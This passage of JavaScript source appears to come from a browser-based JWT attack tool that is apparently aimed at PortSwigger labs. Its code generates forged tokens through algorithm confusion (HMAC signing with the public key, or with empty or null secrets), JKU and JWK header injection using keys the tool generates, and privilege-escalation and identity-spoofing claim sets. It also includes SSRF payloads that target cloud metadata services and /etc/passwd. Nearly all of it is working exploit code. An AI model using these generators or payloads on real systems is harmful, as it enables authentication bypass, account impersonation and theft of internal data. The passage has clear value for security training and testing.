                { from: 'RS256', to: 'HS256', desc: 'üîß PKCS1 DER bytes (ASN.1 Raw)', payload: adminPayload, secret: 'PKCS1_DER' },
                { from: 'RS256', to: 'HS256', desc: 'üìê Minimal RSA (n,e only)', payload: adminPayload, secret: 'MINIMAL_RSA' },
                { from: 'RS256', to: 'HS256', desc: 'üî§ Base64 PEM (Double Encoded)', payload: adminPayload, secret: 'BASE64_PEM' },
                { from: 'RS256', to: 'HS256', desc: 'üìè 64-char wrapped PEM (Standard)', payload: adminPayload, secret: 'WRAPPED_PEM' },

                // Alternative Algorithms
                { from: 'RS384', to: 'HS384', desc: 'üîê RSA-384 to HMAC-384', payload: adminPayload, secret: pemKey },
                { from: 'RS512', to: 'HS512', desc: 'üõ°Ô∏è RSA-512 to HMAC-512', payload: adminPayload, secret: pemKey },

                // Edge Cases for Vulnerable Implementations
                { from: 'RS256', to: 'HS256', desc: '‚ùå Empty secret (Null Key)', payload: adminPayload, secret: 'EMPTY' },
                { from: 'RS256', to: 'HS256', desc: 'üö´ Zero key (Single Null Byte)', payload: adminPayload, secret: 'ZERO' },
                { from: 'RS256', to: 'HS256', desc: 'üìù String "null" (Literal)', payload: adminPayload, secret: 'NULL_STRING' }
            ];

            for (const mapping of algorithmMappings) {
                const header = {
                    alg: mapping.to,
                    typ: decodedToken.header.typ || 'JWT'
                };
                // Remove asymmetric-specific headers when switching to symmetric
                // kid, jku, jwk, etc. should not be present for HMAC

                try {
                    let keySecret;

                    switch(mapping.secret) {
                        case 'DER_BYTES':
                            // Raw DER bytes from X.509 base64-decoded public key
                            const pubKeyContent = pemKey.replace(/-----BEGIN PUBLIC KEY-----/g, '')
                                                       .replace(/-----END PUBLIC KEY-----/g, '')
                                                       .replace(/\r?\n|\r/g, '');
                            keySecret = new Uint8Array(atob(pubKeyContent).split('').map(c => c.charCodeAt(0)));
                            break;

                        case 'PKCS1_PEM':
                            // PKCS1 PEM format (BEGIN RSA PUBLIC KEY)
                            keySecret = new TextEncoder().encode(pkcs1Key);
                            break;

                        case 'PKCS1_DER':
                            // PKCS1 DER bytes (ASN.1 raw format)
                            const pkcs1Content = pkcs1Key.replace(/-----BEGIN RSA PUBLIC KEY-----/g, '')
                                                        .replace(/-----END RSA PUBLIC KEY-----/g, '')
                                                        .replace(/\r?\n|\r/g, '');
                            keySecret = new Uint8Array(atob(pkcs1Content).split('').map(c => c.charCodeAt(0)));
                            break;

                        case 'MINIMAL_RSA':
                            // Minimal RSA key (just n,e values)
                            keySecret = new TextEncoder().encode(this.extractMinimalRSA(pemKey));
                            break;

                        case 'BASE64_PEM':
                            // Double base64 encoded PEM
                            keySecret = new TextEncoder().encode(btoa(pemKey));
                            break;

                        case 'WRAPPED_PEM':
                            // PEM with standard 64-character wrapping
                            keySecret = new TextEncoder().encode(this.wrapPEM64(pemKey));
                            break;

                        case 'EMPTY':
                            // Empty secret for null key vulnerabilities
                            keySecret = new Uint8Array([]);
                            break;

                        case 'ZERO':
                            // Single null byte
                            keySecret = new Uint8Array([0]);
                            break;

                        case 'NULL_STRING':
                            // Literal string "null"
                            keySecret = new TextEncoder().encode('null');
                            break;

                        default:
                            // Use the string directly as HMAC secret
                            keySecret = new TextEncoder().encode(mapping.secret);
                            break;
                    }

                    const signedToken = await this.signJwtHmac(header, mapping.payload, keySecret, mapping.to);

                    this.generatedPayloads.push({
                        title: `üîÑ ${mapping.desc}`,
                        payload: signedToken,
                        description: `Algorithm confusion: ${mapping.from} ‚Üí ${mapping.to}`,
                        explanation: `This payload changes the algorithm from "${mapping.from}" to "${mapping.to}" and is ACTUALLY SIGNED with the public key as the HMAC secret. If the server doesn't properly validate key types, it will verify this token using the public key as a symmetric secret.`,
                        testMethod: `Submit this properly signed token to the application. The server should accept it if it's vulnerable to algorithm confusion attacks.`
                    });
                } catch (signingError) {
                    console.warn(`Failed to sign algorithm confusion token for ${mapping.desc}:`, signingError);
                }
            }

        } catch (error) {
            this.showError(`Failed to process algorithm confusion attack: ${error.message}`);
        }
    },

    // =================== JKU/X5U MANIPULATION ATTACK ===================
    generateJkuManipulationConfig: function() {
        return `
            <div class="config-section">
                <h4>üåê JKU/X5U Manipulation Attack</h4>
                <p class="attack-description">
                    This attack manipulates the "jku" (JWK Set URL) parameter to point to an attacker-controlled server hosting a malicious JWK Set.
                    The server loads the malicious public key, allowing you to sign tokens with the corresponding private key.
                    <strong>Perfect for PortSwigger Lab: JWT authentication bypass via JKU header injection!</strong>
                </p>

                <div class="config-group">
                    <label for="original-token-jku">Original JWT Token *</label>
                    <textarea id="original-token-jku" placeholder="Paste your JWT token here..." rows="4"></textarea>
                    <small class="field-hint">üìù Paste the JWT token you want to modify</small>
                </div>

                <div class="config-group">
                    <label for="attacker-url-jku">Attacker-Controlled JWK Set URL *</label>
                    <input type="text" id="attacker-url-jku" placeholder="https://exploit-server.com/jwks.json" value="https://exploit-server.com/jwks.json">
                    <small class="field-hint">üåê URL where you'll host the malicious JWK Set (e.g., PortSwigger exploit server)</small>
                </div>

                <div class="config-group checkbox-group">
                    <label>
                        <input type="checkbox" id="generate-rsa-keys-jku" checked>
                        <span class="checkmark"></span>
                        Generate New RSA Key Pair
                    </label>
                    <small class="field-hint">üîë Generate fresh RSA keys for this attack</small>
                </div>

                <div class="config-group checkbox-group">
                    <label>
                        <input type="checkbox" id="modify-payload-jku" checked>
                        <span class="checkmark"></span>
                        Modify Token Payload
                    </label>
                    <small class="field-hint">üîß Enable payload modification for privilege escalation</small>
                </div>

                <div class="config-group">
                    <label for="custom-claims-jku">Custom Claims (JSON)</label>
                    <textarea id="custom-claims-jku" placeholder='{"sub": "administrator", "role": "admin"}' rows="3">{"sub": "administrator"}</textarea>
                    <small class="field-hint">‚ö° Claims to inject (e.g., change user to administrator)</small>
                </div>

                <div class="config-group checkbox-group">
                    <label>
                        <input type="checkbox" id="include-ssrf-jku">
                        <span class="checkmark"></span>
                        Include SSRF Test Payloads
                    </label>
                    <small class="field-hint">üéØ Generate additional SSRF testing payloads</small>
                </div>

                <div class="attack-info">
                    <h5>üîç PortSwigger Lab Attack Flow:</h5>
                    <ol>
                        <li><strong>Generate RSA Key Pair:</strong> Create attacker-controlled keys</li>
                        <li><strong>Create JWK Set:</strong> Host the public key in JWK format</li>
                        <li><strong>Inject JKU Parameter:</strong> Point JWT to your JWK Set URL</li>
                        <li><strong>Modify Claims:</strong> Change "sub" to "administrator" for admin access</li>
                        <li><strong>Sign with Private Key:</strong> Create properly signed malicious JWT</li>
                        <li><strong>Bypass Authentication:</strong> Server trusts your key and grants admin access</li>
                    </ol>
                </div>

                <div class="config-actions">
                    <button class="generate-attack-btn" data-attack="jku-manipulation">
                        <i class="fas fa-rocket"></i> Generate JKU Attack Payloads & JWK Set
                    </button>
                </div>
            </div>
        `;
    },

    async generateJkuManipulationPayloads() {
        const token = document.getElementById('original-token-jku')?.value?.trim();
        const attackerUrl = document.getElementById('attacker-url-jku')?.value?.trim();
        const generateKeys = document.getElementById('generate-rsa-keys-jku')?.checked;
        const modifyPayload = document.getElementById('modify-payload-jku')?.checked;
        const customClaims = document.getElementById('custom-claims-jku')?.value?.trim();
        const includeSsrf = document.getElementById('include-ssrf-jku')?.checked;

        if (!token) {
            this.showError('Please provide the original JWT token');
            return;
        }

        if (!attackerUrl) {
            this.showError('Please provide the attacker-controlled JWK Set URL');
            return;
        }

        try {
            const decodedToken = this.decodeJWT(token);
            this.generatedPayloads = [];

            // Prepare payload with custom claims
            let basePayload = { ...decodedToken.payload };
            if (modifyPayload && customClaims) {
                try {
                    const additionalClaims = JSON.parse(customClaims);
                    basePayload = { ...basePayload, ...additionalClaims };
                } catch (e) {
                    this.showError(`Invalid JSON in custom claims: ${e.message}`);
                    return;
                }
            }

            // Generate RSA key pair if requested
            let rsaKeyPair = null;
            let jwkSet = null;
            let kid = `jku-attack-${Date.now()}`;

            if (generateKeys) {
                showNotification('Generating RSA key pair for JKU attack...', 'info', 3000);
                rsaKeyPair = await this.generateRSAKeyPair(2048);

                // Create JWK from public key
                const publicKeyJwk = await this.convertRSAPublicKeyToJWK(rsaKeyPair.publicKey, kid);
                jwkSet = {
                    keys: [publicKeyJwk]
                };
            }

            // Main JKU attack payload (PortSwigger lab style)
            if (rsaKeyPair) {
                try {
                    // Create header with JKU parameter
                    const maliciousHeader = {
                        ...decodedToken.header,
                        jku: attackerUrl,
                        kid: kid,
                        alg: decodedToken.header.alg || 'RS256'
                    };

                    // Sign the token with our private key
                    const signedToken = await this.signJWTWithRSA(maliciousHeader, basePayload, rsaKeyPair.privateKey);

                    this.generatedPayloads.push({
                        title: 'üéØ JKU Header Injection (PortSwigger Lab)',
                        payload: signedToken,
                        description: 'JKU injection with properly signed JWT using attacker-controlled key',
                        explanation: `This is a PROPERLY SIGNED JWT that uses the "jku" parameter to load the public key from ${attackerUrl}. The token is signed with the corresponding private key, so if the server trusts the JKU URL, this token will be valid.`,
                        testMethod: `1. Host the JWK Set (provided below) at ${attackerUrl}\n2. Submit this JWT to the application\n3. The server should fetch your JWK Set and validate the token\n4. If vulnerable, you'll gain access with the modified claims`,
                        isMainPayload: true
                    });

                    // Add the JWK Set that needs to be hosted
                    this.generatedPayloads.push({
                        title: 'üìÑ JWK Set to Host',
                        payload: JSON.stringify(jwkSet, null, 2),
                        description: `Host this JWK Set at: ${attackerUrl}`,
                        explanation: `This is the malicious JWK Set containing the public key. You MUST host this JSON at ${attackerUrl} for the attack to work. In PortSwigger labs, paste this into the exploit server body.`,
                        testMethod: `Save this as a JSON file and host it at the exact URL specified in the JKU parameter: ${attackerUrl}`,
                        isJwkSet: true
                    });

                    // Additional variations for testing
                    const variations = [
                        { param: 'jku', url: attackerUrl.replace('https://', 'http://'), desc: 'HTTP downgrade' },
                        { param: 'jku', url: `${attackerUrl}?cachebuster=${Date.now()}`, desc: 'Cache busting' },
                        { param: 'jku', url: attackerUrl.replace('.json', '.jwks'), desc: 'Alternative extension' }
                    ];

                    for (const variation of variations) {
                        const varHeader = {
                            ...decodedToken.header,
                            [variation.param]: variation.url,
                            kid: kid,
                            alg: decodedToken.header.alg || 'RS256'
                        };

                        const varToken = await this.signJWTWithRSA(varHeader, basePayload, rsaKeyPair.privateKey);

                        this.generatedPayloads.push({
                            title: `üîÄ ${variation.desc}`,
                            payload: varToken,
                            description: `${variation.param.toUpperCase()}: ${variation.url}`,
                            explanation: `Variation using ${variation.url} for ${variation.desc} testing.`,
                            testMethod: `Host the same JWK Set at this URL and test the token.`
                        });
                    }

                } catch (signingError) {
                    this.showError(`Failed to sign JWT with RSA key: ${signingError.message}`);
                    return;
                }
            }

            // SSRF testing payloads (if enabled)
            if (includeSsrf) {
                const ssrfPayloads = [
                    { param: 'jku', url: 'http://169.254.169.254/latest/meta-data/', desc: 'AWS metadata service' },
                    { param: 'jku', url: 'http://metadata.google.internal/computeMetadata/v1/', desc: 'GCP metadata service' },
                    { param: 'jku', url: 'http://localhost:8080/admin', desc: 'Local admin panel' },
                    { param: 'jku', url: 'http://127.0.0.1:3306/', desc: 'Local MySQL scan' },
                    { param: 'jku', url: 'http://internal.company.com/', desc: 'Internal network scan' },
                    { param: 'jku', url: 'file:///etc/passwd', desc: 'Local file access' }
                ];

                ssrfPayloads.forEach(ssrf => {
                    const ssrfHeader = { ...decodedToken.header, [ssrf.param]: ssrf.url };
                    const encodedHeader = this.base64UrlEncode(JSON.stringify(ssrfHeader));
                    const encodedPayload = this.base64UrlEncode(JSON.stringify(basePayload));
                    const ssrfToken = `${encodedHeader}.${encodedPayload}.unsigned_ssrf_test`;

                    this.generatedPayloads.push({
                        title: `üéØ SSRF: ${ssrf.desc}`,
                        payload: ssrfToken,
                        description: `SSRF test: ${ssrf.url}`,
                        explanation: `This payload tests for SSRF vulnerabilities by pointing the ${ssrf.param} parameter to ${ssrf.url}. Monitor your logs for outbound requests.`,
                        testMethod: `Submit this token and monitor network traffic or logs for requests to ${ssrf.url}.`,
                        isSsrfTest: true
                    });
                });
            }

            showNotification('JKU attack payloads generated successfully! Host the JWK Set at the specified URL.', 'success');

        } catch (error) {
            this.showError(`Failed to generate JKU attack payloads: ${error.message}`);
        }
    },

    // =================== JWK HEADER INJECTION ATTACK ===================
    generateJwkInjectionConfig: function() {
        return `
            <div class="config-section">
                <h4>üîë JWK Header Injection Attack</h4>
                <p class="attack-description">
                    This attack embeds a malicious public key directly in the JWT header using the "jwk" parameter.
                    If the application trusts the embedded key, you can sign tokens with your own private key.
                </p>

                <div class="config-group">
                    <label for="original-token-jwk">Original JWT Token *</label>
                    <textarea id="original-token-jwk" placeholder="Paste your JWT token here..." rows="4"></textarea>
                    <small class="field-hint">üìù Paste the JWT token you want to modify</small>
                </div>

                <div class="config-group">
                    <label>Key Generation Method</label>
                    <div class="radio-group">
                        <label>
                            <input type="radio" name="key-method-jwk" value="generate" checked>
                            <span class="radio-checkmark"></span>
                            Auto-generate fresh RSA key pair (Recommended)
                        </label>
                        <label>
                            <input type="radio" name="key-method-jwk" value="custom" disabled>
                            <span class="radio-checkmark"></span>
                            Use custom public key (Coming Soon)
                        </label>
                    </div>
                </div>

                <div class="config-group" id="custom-pubkey-group-jwk" style="display: none;">
                    <label for="custom-pubkey-jwk">Custom Public Key (PEM)</label>
                    <textarea id="custom-pubkey-jwk" placeholder="-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA...
-----END PUBLIC KEY-----" rows="6"></textarea>
                    <small class="field-hint">üîë Your RSA public key in PEM format</small>
                </div>

                <div class="config-group checkbox-group">
                    <label>
                        <input type="checkbox" id="modify-payload-jwk" checked>
                        <span class="checkmark"></span>
                        Modify Token Payload
                    </label>
                    <small class="field-hint">üîß Enable payload modification for privilege escalation</small>
                </div>

                <div class="config-group">
                    <label for="custom-claims-jwk">Custom Claims (JSON)</label>
                    <textarea id="custom-claims-jwk" placeholder='{"sub": "admin", "role": "administrator", "iat": 9999999999}' rows="3"></textarea>
                    <small class="field-hint">‚ö° Add custom claims to test privilege escalation</small>
                </div>

                <div class="attack-info">
                    <h5>üîç JWK Injection Techniques:</h5>
                    <ul>
                        <li><strong>Direct JWK Injection:</strong> Embed complete public key in header</li>
                        <li><strong>RSA Key Injection:</strong> Use RSA public key components (n, e)</li>
                        <li><strong>ECDSA Key Injection:</strong> Embed ECDSA public key parameters</li>
                        <li><strong>Key ID Confusion:</strong> Combine with kid parameter manipulation</li>
                        <li><strong>Algorithm Override:</strong> Force specific algorithm usage</li>
                    </ul>
                </div>

                <div class="config-actions">
                    <button class="generate-attack-btn" data-attack="jwk-injection">
                        <i class="fas fa-rocket"></i> Generate JWK Injection Payloads
                    </button>
                </div>
            </div>
        `;
    },

    async generateJwkInjectionPayloads() {
        const token = document.getElementById('original-token-jwk')?.value?.trim();
        const keyMethod = document.querySelector('input[name="key-method-jwk"]:checked')?.value;
        const customPubKey = document.getElementById('custom-pubkey-jwk')?.value?.trim();
        const modifyPayload = document.getElementById('modify-payload-jwk')?.checked;
        const customClaims = document.getElementById('custom-claims-jwk')?.value?.trim();

        if (!token) {
            this.showError('Please provide the original JWT token');
            return;
        }

        try {
            const decodedToken = this.decodeJWT(token);
            this.generatedPayloads = [];

            let basePayload = { ...decodedToken.payload };

            if (modifyPayload && customClaims) {
                try {
                    const additionalClaims = JSON.parse(customClaims);
                    basePayload = { ...basePayload, ...additionalClaims };
                } catch (e) {
                    this.showError(`Invalid JSON in custom claims: ${e.message}`);
                    return;
                }
            }

            // Generate fresh RSA key pair for each attack
            const rsaKeyData = await this.generateRsaKeyPair();
            const { keyPair, publicKeyJwk } = rsaKeyData;

            // PortSwigger Lab specific: Change sub to administrator for privilege escalation
            const adminPayload = { ...basePayload, sub: 'administrator' };

            // JWK injection variations with REAL RSA SIGNING
            const jwkVariations = [
                {
                    desc: "Fresh RSA key with admin escalation (PortSwigger style)",
                    jwk: publicKeyJwk,
                    algorithm: "RS256",
                    payload: adminPayload
                },
                {
                    desc: "RSA JWK with custom kid",
                    jwk: { ...publicKeyJwk, kid: "malicious-key-1" },
                    algorithm: "RS256",
                    payload: adminPayload
                },
                {
                    desc: "Direct RSA JWK injection",
                    jwk: publicKeyJwk,
                    algorithm: "RS256",
                    payload: basePayload
                },
                {
                    desc: "Minimal RSA JWK",
                    jwk: { kty: "RSA", n: publicKeyJwk.n, e: publicKeyJwk.e },
                    algorithm: "RS256",
                    payload: basePayload
                }
            ];

            for (const variation of jwkVariations) {
                const header = {
                    alg: variation.algorithm,
                    jwk: variation.jwk
                };
                // Remove kid parameter when using embedded JWK - they're mutually exclusive

                try {
                    // Actually sign with the generated private key
                    const signedToken = await this.signJwtRsa(header, variation.payload, keyPair.privateKey);

                    this.generatedPayloads.push({
                        title: `üîë ${variation.desc}`,
                        payload: signedToken,
                        description: `JWK injection: ${variation.desc}`,
                        explanation: `This payload embeds a freshly generated RSA public key directly in the JWT header and is properly signed with the corresponding private key. If the application trusts the embedded "jwk" parameter, it will verify this token successfully.`,
                        testMethod: `Submit this properly signed token. The server should accept it if it trusts embedded JWK parameters. Perfect for PortSwigger lab scenarios.`
                    });
                } catch (signingError) {
                    console.warn(`Failed to sign JWK token for ${variation.desc}:`, signingError);
                }
            }

        } catch (error) {
            this.showError(`Failed to process JWK injection attack: ${error.message}`);
        }
    },

    // =================== PRIVILEGE ESCALATION ATTACK ===================
    generatePrivilegeEscalationConfig: function() {
        return `
            <div class="config-section">
                <h4>‚¨ÜÔ∏è Privilege Escalation Attack</h4>
                <p class="attack-description">
                    This attack focuses on modifying JWT payload claims to escalate privileges, bypass roles,
                    and gain unauthorized access to protected resources through claim manipulation.
                </p>

                <div class="config-group">
                    <label for="original-token-priv">Original JWT Token *</label>
                    <textarea id="original-token-priv" placeholder="Paste your JWT token here..." rows="4"></textarea>
                    <small class="field-hint">üìù Paste the JWT token you want to escalate</small>
                </div>

                <div class="config-group">
                    <label>Escalation Targets</label>
                    <div class="checkbox-group-multi">
                        <label><input type="checkbox" id="escalate-role" checked> <span class="checkmark"></span> Role Escalation</label>
                        <label><input type="checkbox" id="escalate-admin" checked> <span class="checkmark"></span> Admin Privileges</label>
                        <label><input type="checkbox" id="escalate-user" checked> <span class="checkmark"></span> User Impersonation</label>
                        <label><input type="checkbox" id="escalate-scope" checked> <span class="checkmark"></span> Scope Expansion</label>
                        <label><input type="checkbox" id="escalate-time" checked> <span class="checkmark"></span> Time Manipulation</label>
                    </div>
                </div>

                <div class="config-group">
                    <label for="target-user-priv">Target User (Optional)</label>
                    <input type="text" id="target-user-priv" placeholder="admin">
                    <small class="field-hint">üë§ Specific user to impersonate</small>
                </div>

                <div class="config-group">
                    <label for="custom-role-priv">Custom Role (Optional)</label>
                    <input type="text" id="custom-role-priv" placeholder="administrator">
                    <small class="field-hint">üîê Custom role for escalation</small>
                </div>

                <div class="config-group">
                    <label for="additional-claims-priv">Additional Claims (JSON)</label>
                    <textarea id="additional-claims-priv" placeholder='{"permissions": ["read", "write", "delete"], "is_admin": true}' rows="3"></textarea>
                    <small class="field-hint">‚ö° Additional claims to inject</small>
                </div>

                <div class="attack-info">
                    <h5>üîç Privilege Escalation Techniques:</h5>
                    <ul>
                        <li><strong>Role Manipulation:</strong> Change role from user to admin/root</li>
                        <li><strong>User Impersonation:</strong> Change sub/user_id to target user</li>
                        <li><strong>Scope Expansion:</strong> Add privileged scopes and permissions</li>
                        <li><strong>Time Manipulation:</strong> Extend token validity (iat/exp)</li>
                        <li><strong>Permission Injection:</strong> Add admin flags and capabilities</li>
                    </ul>
                </div>

                <div class="config-actions">
                    <button class="generate-attack-btn" data-attack="privilege-escalation">
                        <i class="fas fa-rocket"></i> Generate Privilege Escalation Payloads
                    </button>
                </div>
            </div>
        `;
    },

    generatePrivilegeEscalationPayloads: function() {
        const token = document.getElementById('original-token-priv')?.value?.trim();
        const escalateRole = document.getElementById('escalate-role')?.checked;
        const escalateAdmin = document.getElementById('escalate-admin')?.checked;
        const escalateUser = document.getElementById('escalate-user')?.checked;
        const escalateScope = document.getElementById('escalate-scope')?.checked;
        const escalateTime = document.getElementById('escalate-time')?.checked;
        const targetUser = document.getElementById('target-user-priv')?.value?.trim();
        const customRole = document.getElementById('custom-role-priv')?.value?.trim();
        const additionalClaims = document.getElementById('additional-claims-priv')?.value?.trim();

        if (!token) {
            this.showError('Please provide the original JWT token');
            return;
        }

        try {
            const decodedToken = this.decodeJWT(token);
            this.generatedPayloads = [];

            const originalPayload = decodedToken.payload;
            const encodedHeader = this.base64UrlEncode(JSON.stringify(decodedToken.header));

            // Parse additional claims
            let extraClaims = {};
            if (additionalClaims) {
                try {
                    extraClaims = JSON.parse(additionalClaims);
                } catch (e) {
                    this.showError(`Invalid JSON in additional claims: ${e.message}`);
                    return;
                }
            }

            // Role escalation payloads
            if (escalateRole) {
                const roleVariations = [
                    { role: customRole || 'admin', desc: 'Custom admin role' },
                    { role: 'administrator', desc: 'Administrator role' },
                    { role: 'root', desc: 'Root privileges' },
                    { role: 'superuser', desc: 'Superuser privileges' },
                    { role: 'moderator', desc: 'Moderator privileges' },
                    { role: 'owner', desc: 'Owner privileges' },
                    { role: 'manager', desc: 'Manager role' }
                ];

                roleVariations.forEach(variant => {
                    const payload = { ...originalPayload, ...extraClaims, role: variant.role };
                    const encodedPayload = this.base64UrlEncode(JSON.stringify(payload));
                    const escalatedToken = `${encodedHeader}.${encodedPayload}.signature`;

                    this.generatedPayloads.push({
                        title: `‚¨ÜÔ∏è Role Escalation - ${variant.desc}`,
                        payload: escalatedToken,
                        description: `Role escalation to: ${variant.role}`,
                        explanation: `This payload changes the user's role to "${variant.role}" to gain elevated privileges. If the application relies solely on JWT claims for authorization, this may grant unauthorized access.`,
                        testMethod: `Submit this token to protected endpoints that require "${variant.role}" privileges and monitor for successful authorization bypass.`
                    });
                });
            }

            // Admin privilege escalation
            if (escalateAdmin) {
                const adminVariations = [
                    { claims: { is_admin: true }, desc: 'Admin flag injection' },
                    { claims: { admin: true }, desc: 'Admin boolean flag' },
                    { claims: { is_superuser: true }, desc: 'Superuser flag' },
                    { claims: { permissions: ['*'] }, desc: 'Wildcard permissions' },
                    { claims: { access_level: 'admin' }, desc: 'Admin access level' },
                    { claims: { user_type: 'admin' }, desc: 'Admin user type' },
                    { claims: { privileges: ['admin', 'read', 'write', 'delete'] }, desc: 'Full privilege set' }
                ];

                adminVariations.forEach(variant => {
                    const payload = { ...originalPayload, ...extraClaims, ...variant.claims };
                    const encodedPayload = this.base64UrlEncode(JSON.stringify(payload));
                    const adminToken = `${encodedHeader}.${encodedPayload}.signature`;

                    this.generatedPayloads.push({
                        title: `üîê Admin Escalation - ${variant.desc}`,
                        payload: adminToken,
                        description: `Admin privilege injection: ${JSON.stringify(variant.claims)}`,
                        explanation: `This payload injects administrative privileges through the claims: ${JSON.stringify(variant.claims)}. If the application trusts these JWT claims, it may grant admin-level access.`,
                        testMethod: `Test this token against admin-only endpoints and functionality. Monitor for successful access to administrative features.`
                    });
                });
            }

            // User impersonation
            if (escalateUser) {
                const userTargets = [
                    targetUser || 'admin',
                    'administrator',
                    'root',
                    '1',
                    '0',
                    'system',
                    'service'
                ];

                userTargets.forEach(user => {
                    const payload = { ...originalPayload, ...extraClaims };

                    // Try different user identification claims
                    ['sub', 'user_id', 'username', 'email', 'user'].forEach(claimName => {
                        const userPayload = { ...payload };
                        userPayload[claimName] = user;

                        const encodedPayload = this.base64UrlEncode(JSON.stringify(userPayload));
                        const impersonationToken = `${encodedHeader}.${encodedPayload}.signature`;

                        this.generatedPayloads.push({
                            title: `üë§ User Impersonation - ${claimName}: ${user}`,
                            payload: impersonationToken,
                            description: `User impersonation via ${claimName}: ${user}`,
                            explanation: `This payload changes the "${claimName}" claim to "${user}" to impersonate a different user. If successful, you may gain access to that user's resources and permissions.`,
                            testMethod: `Submit this token and verify if you can access resources belonging to user "${user}". Check for successful impersonation.`
                        });
                    });
                });
            }

            // Time manipulation
            if (escalateTime) {
                const currentTime = Math.floor(Date.now() / 1000);
                const timeVariations = [
                    { iat: currentTime, exp: currentTime + 86400 * 365, desc: 'Extended to 1 year' },
                    { iat: 0, exp: currentTime + 86400 * 30, desc: 'Backdated issue time' },
                    { iat: currentTime, exp: 9999999999, desc: 'Far future expiration' },
                    { nbf: 0, iat: currentTime, exp: currentTime + 86400 * 90, desc: 'No before restriction removal' }
                ];

                timeVariations.forEach(variant => {
                    const payload = { ...originalPayload, ...extraClaims, ...variant };
                    const encodedPayload = this.base64UrlEncode(JSON.stringify(payload));
                    const timeToken = `${encodedHeader}.${encodedPayload}.signature`;

                    this.generatedPayloads.push({
                        title: `‚è∞ Time Manipulation - ${variant.desc}`,
                        payload: timeToken,
                        description: `Time manipulation: ${variant.desc}`,
                        explanation: `This payload modifies the token's time-related claims to extend validity or remove restrictions. This may allow long-term unauthorized access.`,
                        testMethod: `Store this token and test it over time to verify extended validity. Monitor for persistent unauthorized access.`
                    });
                });
            }

        } catch (error) {
            this.showError(`Failed to process privilege escalation attack: ${error.message}`);
        }
    },

    // =================== CLAIM SPOOFING ATTACK ===================
    generateClaimSpoofingConfig: function() {
        return `
            <div class="config-section">
                <h4>üé≠ Claim Spoofing Attack</h4>
                <p class="attack-description">
                    This attack manipulates various JWT claims to bypass authentication and authorization checks,
                    spoof user identity, and forge critical security-related information.
                </p>

                <div class="config-group">
                    <label for="original-token-claim">Original JWT Token *</label>
                    <textarea id="original-token-claim" placeholder="Paste your JWT token here..." rows="4"></textarea>
                    <small class="field-hint">üìù Paste the JWT token you want to modify</small>
                </div>

                <div class="config-group">
                    <label>Spoofing Targets</label>
                    <div class="checkbox-group-multi">
                        <label><input type="checkbox" id="spoof-identity" checked> <span class="checkmark"></span> Identity Claims</label>
                        <label><input type="checkbox" id="spoof-issuer" checked> <span class="checkmark"></span> Issuer Claims</label>
                        <label><input type="checkbox" id="spoof-audience" checked> <span class="checkmark"></span> Audience Claims</label>
                        <label><input type="checkbox" id="spoof-session" checked> <span class="checkmark"></span> Session Claims</label>
                        <label><input type="checkbox" id="spoof-auth" checked> <span class="checkmark"></span> Auth Claims</label>
                    </div>
                </div>

                <div class="config-group">
                    <label for="target-issuer-claim">Target Issuer (Optional)</label>
                    <input type="text" id="target-issuer-claim" placeholder="https://trusted-auth-server.com">
                    <small class="field-hint">üè¢ Trusted issuer to impersonate</small>
                </div>

                <div class="config-group">
                    <label for="target-audience-claim">Target Audience (Optional)</label>
                    <input type="text" id="target-audience-claim" placeholder="admin-api">
                    <small class="field-hint">üéØ Target audience for the token</small>
                </div>

                <div class="config-group">
                    <label for="spoofed-claims-claim">Custom Spoofed Claims (JSON)</label>
                    <textarea id="spoofed-claims-claim" placeholder='{"email": "admin@company.com", "verified": true}' rows="3"></textarea>
                    <small class="field-hint">üé≠ Custom claims to spoof</small>
                </div>

                <div class="attack-info">
                    <h5>üîç Claim Spoofing Techniques:</h5>
                    <ul>
                        <li><strong>Identity Spoofing:</strong> Fake email, username, user ID</li>
                        <li><strong>Issuer Spoofing:</strong> Impersonate trusted auth servers</li>
                        <li><strong>Audience Spoofing:</strong> Target specific services/APIs</li>
                        <li><strong>Session Spoofing:</strong> Manipulate session and device info</li>
                        <li><strong>Auth Level Spoofing:</strong> Fake MFA and verification status</li>
                    </ul>
                </div>

                <div class="config-actions">
                    <button class="generate-attack-btn" data-attack="claim-spoofing">
                        <i class="fas fa-rocket"></i> Generate Claim Spoofing Payloads
                    </button>
                </div>
            </div>
        `;
    },

    generateClaimSpoofingPayloads: function() {
        const token = document.getElementById('original-token-claim')?.value?.trim();
        const spoofIdentity = document.getElementById('spoof-identity')?.checked;
        const spoofIssuer = document.getElementById('spoof-issuer')?.checked;
        const spoofAudience = document.getElementById('spoof-audience')?.checked;
        const spoofSession = document.getElementById('spoof-session')?.checked;
        const spoofAuth = document.getElementById('spoof-auth')?.checked;
        const targetIssuer = document.getElementById('target-issuer-claim')?.value?.trim();
        const targetAudience = document.getElementById('target-audience-claim')?.value?.trim();
        const spoofedClaims = document.getElementById('spoofed-claims-claim')?.value?.trim();

        if (!token) {
            this.showError('Please provide the original JWT token');
            return;
        }

        try {
            const decodedToken = this.decodeJWT(token);
            this.generatedPayloads = [];

            const originalPayload = decodedToken.payload;
            const encodedHeader = this.base64UrlEncode(JSON.stringify(decodedToken.header));

            let baseSpoofedClaims = {};
            if (spoofedClaims) {
                try {
                    baseSpoofedClaims = JSON.parse(spoofedClaims);
                } catch (e) {
                    this.showError(`Invalid JSON in spoofed claims: ${e.message}`);
                    return;
                }
            }

            // Identity spoofing
            if (spoofIdentity) {
                const identityVariations = [
                    { email: 'admin@company.com', username: 'admin', desc: 'Admin identity' },
                    { email: 'support@company.com', username: 'support', desc: 'Support identity' },
                    { email: 'service@company.com', username: 'service', desc: 'Service account' },
                    { user_id: '1', username: 'root', desc: 'Root user ID' },
                    { user_id: '0', username: 'system', desc: 'System user' },
                    { sub: 'admin', email: 'admin@domain.com', desc: 'Subject spoofing' },
                    { phone_verified: true, email_verified: true, desc: 'Verified status spoofing' }
                ];

                identityVariations.forEach(variant => {
                    const payload = { ...originalPayload, ...baseSpoofedClaims, ...variant };
                    delete payload.desc; // Remove description from actual payload
                    const encodedPayload = this.base64UrlEncode(JSON.stringify(payload));
                    const spoofedToken = `${encodedHeader}.${encodedPayload}.signature`;

                    this.generatedPayloads.push({
                        title: `üé≠ Identity Spoofing - ${variant.desc}`,
                        payload: spoofedToken,
                        description: `Identity spoofing: ${variant.desc}`,
                        explanation: `This payload spoofs identity claims to impersonate a different user or account type. The modified claims include: ${Object.keys(variant).filter(k => k !== 'desc').join(', ')}.`,
                        testMethod: `Submit this token to identity-dependent endpoints and verify if the application treats you as the spoofed identity.`
